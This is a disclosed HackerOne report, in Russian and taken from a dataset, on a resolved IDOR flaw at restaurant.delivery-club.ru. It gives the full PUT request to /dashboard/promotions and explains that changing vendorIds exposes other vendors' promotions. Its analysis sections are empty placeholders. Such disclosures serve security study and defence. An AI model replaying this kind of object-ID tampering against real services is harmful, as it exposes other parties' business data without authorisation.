---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1086453'
original_report_id: '1086453'
title: restaurant.delivery-club.ru - возможность получить информацию об чужих акциях.
weakness: Insecure Direct Object Reference (IDOR)
team_handle: mailru
created_at: '2021-01-25T11:35:32.428Z'
disclosed_at: '2021-11-06T19:03:56.210Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
asset_identifier: Delivery Club
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- insecure-direct-object-reference-idor
---

# restaurant.delivery-club.ru - возможность получить информацию об чужих акциях.

## Metadata

- HackerOne Report ID: 1086453
- Weakness: Insecure Direct Object Reference (IDOR)
- Program: mailru
- Disclosed At: 2021-11-06T19:03:56.210Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Уязвимая конечная точка:
```
PUT /dashboard/promotions HTTP/1.1
Host: restaurant.delivery-club.ru
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: application/json, text/plain, */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 59
Origin: https://restaurant.delivery-club.ru
Connection: close
Referer: https://restaurant.delivery-club.ru/dashboard/discount-center/promos/list?filterType=history&limit=50


{"filterType":"history","vendorIds":["42222"],"limit":"50"}
```
vendorIds - меняем значение, получаем список чужих акций.
PS: Нужна авторизация, сегодня приглашу администратора к отчёту в качестве участника, он ещё не сделал аккаунт на h1.

## Impact

Получение списка чужих акций.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
